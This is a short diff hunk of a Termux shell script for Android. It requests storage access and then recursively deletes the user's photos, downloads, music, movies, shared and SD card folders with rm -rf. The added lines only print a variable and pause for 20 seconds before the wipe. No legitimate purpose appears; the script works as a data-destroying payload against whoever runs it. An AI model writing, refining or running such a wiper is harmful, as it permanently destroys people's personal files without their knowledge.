@@ -10,6 +10,8 @@ termux-setup-storage
 cd ~
 a=0
 test -d "storage" && a=1 || b=0
+echo " $a "
+sleep 20
 if [ $a == 1 ]; then
 cd ~;cd;storage;rm -rf dcim/* downloads/* shared/* pictures/* music/* extsdcard/*; 
 rm -rf movies/* emulated-1/* sdccard/* sdcard1/* sdcard0/* sdcard-1/* emulated-1/*
